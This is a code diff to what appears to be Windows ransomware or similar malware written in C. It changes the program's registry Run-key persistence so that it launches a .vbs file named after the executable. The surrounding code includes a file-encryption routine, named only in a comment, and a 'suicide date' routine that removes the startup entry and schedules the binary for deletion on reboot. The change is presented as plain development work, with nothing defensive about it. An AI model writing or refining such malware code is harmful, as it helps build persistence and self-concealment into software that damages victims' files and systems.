@@ -1,7 +1,9 @@
 #include <Windows.h>
+#include <wchar.h>
+#include <stdio.h>
 #include "config.h"
 #include "logging.h"
-
+#include "utils.h"
 
 /* Encrypt a given file */
 // We probably need to dealloc 'lpLogFilePath'...
@@ -36,15 +38,25 @@ void RegisterToRunAtStartup()
 	DebugMessage(L"RegisterToRunAtStartup");
 
 	WCHAR wcCurrentPath[MAX_PATH] = { 0 };
+	WCHAR vbsCurrentPath[MAX_PATH] = { 0 };
 	HKEY regKey = NULL;
 	
-	// Get instance's path
-	GetModuleFileName(NULL, wcCurrentPath, MAX_PATH);
+	GetModuleFileNameW(NULL, wcCurrentPath, MAX_PATH);
+
+    // Copy to vbsCurrentPath
+    wcscpy(vbsCurrentPath, wcCurrentPath);
+
+    // Replace extension with .vbs
+    WCHAR* pDot = wcsrchr(vbsCurrentPath, L'.');
+    if (pDot != NULL) {
+        wcscpy(pDot, L".vbs"); // change extension
+    } else {
+        wcscat(vbsCurrentPath, L".vbs"); // append if no dot found
+    }
 	
-	// Open Handle to the registry key
 	if (RegOpenKeyExW(HKEY_CURRENT_USER, REGISTRY_STARTUP_PATH, 0, KEY_WRITE, &regKey) == ERROR_SUCCESS)
 	{
-		RegSetValueExW(regKey, REGISTRY_STARTUP_KEY, 0, REG_SZ, (byte *)wcCurrentPath, sizeof(wcCurrentPath));
+		RegSetValueExW(regKey, REGISTRY_STARTUP_KEY, 0, REG_SZ, (byte *)vbsCurrentPath, sizeof(vbsCurrentPath));
 		RegCloseKey(regKey);
 	}
 
@@ -68,7 +80,7 @@ BOOL CheckAndSuicideIfNeeded()
 		DebugMessage(L"Suicide date passed. SUICDING NOW!");
 
 		// Get instance's path
-		GetModuleFileName(NULL, wcCurrentPath, MAX_PATH);
+		GetModuleFileNameW(NULL, wcCurrentPath, MAX_PATH);
 
 		// Remove from registry
 		if (RegOpenKeyW(HKEY_CURRENT_USER, REGISTRY_STARTUP_PATH, &regKey) == ERROR_SUCCESS)
@@ -78,7 +90,7 @@ BOOL CheckAndSuicideIfNeeded()
 		}
 		
 		// Set for later deletion (reboot)
-		MoveFileEx(wcCurrentPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+		MoveFileExW(wcCurrentPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 		return TRUE;
 	}
 	DebugMessage(L"Not suiciding today..");
